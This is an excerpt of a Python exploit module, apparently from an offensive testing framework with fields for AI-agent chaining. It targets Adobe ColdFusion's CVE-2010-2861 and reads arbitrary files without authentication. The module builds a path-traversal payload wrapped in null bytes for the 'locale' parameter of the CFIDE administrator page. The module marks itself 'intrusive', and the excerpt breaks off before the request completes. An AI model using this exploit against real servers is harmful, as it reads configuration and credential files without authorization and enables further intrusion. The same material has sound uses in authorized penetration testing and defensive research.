#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Reads arbitrary files via CVE-2010-2861 locale parameter POST to CFIDE administrator pages."""
...
class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'Adobe ColdFusion - locale File Read (CVE-2010-2861)',
        'description': (
            'Reads arbitrary files via CVE-2010-2861 locale parameter POST to CFIDE administrator pages.'
        ),
        ...
        'tags': ['coldfusion', 'adobe', 'lfi', 'file-read', 'unauth', 'kev', 'cve-2010-2861'],
        'agent': {
            'risk': 'intrusive',
            ...
            'chain': {
                ...
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2010_2861_detect'],
            },
        },
    }
    ...
    path = OptString('/CFIDE/administrator/enter.cfm', 'ColdFusion path accepting locale', required=False)

    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip().lstrip('/')
        path = str(self.path or '/CFIDE/administrator/enter.cfm')
        data = f'locale=%00../../../../../../../../../../../{remote}%00a'
        r = self.http_request(
